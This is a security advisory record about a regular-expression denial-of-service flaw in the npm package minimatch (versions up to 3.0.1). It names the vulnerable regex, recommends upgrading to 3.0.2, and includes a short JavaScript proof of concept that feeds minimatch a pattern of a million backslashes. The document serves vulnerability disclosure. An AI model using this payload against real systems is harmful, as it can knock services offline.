---
Publication-State: Active
Access: Public
Reviewers:
- Name: Nick Starke
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/minimatch
Review-Date: '2016-06-20'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Regular Expression Denial of Service*<br><br>Recommendation: Updated to version 3.0.2 or greater
### Details
Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects.  The primary function, `minimatch(path, pattern)` is vulnerable to ReDoS in the `pattern` parameter.  This is because of the regular expression on line 521 of minimatch.js: `/((?:\\{2})*)(\\?)\|/g,`.  The problematic portion of the regex is `((?:\\{2})*)` which matches against `\\`.  A proof of concept is as follows: ``` var minimatch = require(“minimatch”);  // utility function for generating long strings var genstr = function (len, chr) {   var result = “”;   for (i=0; i<=len; i++) {     result = result + chr;   }   return result; }  var exploit = “[!” + genstr(1000000, “\\”) + “A”;  // minimatch exploit. console.log(“starting minimatch”); minimatch(“foo”, exploit); console.log(“finishing minimatch”); ```
<br><br>• Affected Versions: <=3.0.1
<br>• Patched Versions: >=3.0.2
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
['https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS']
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
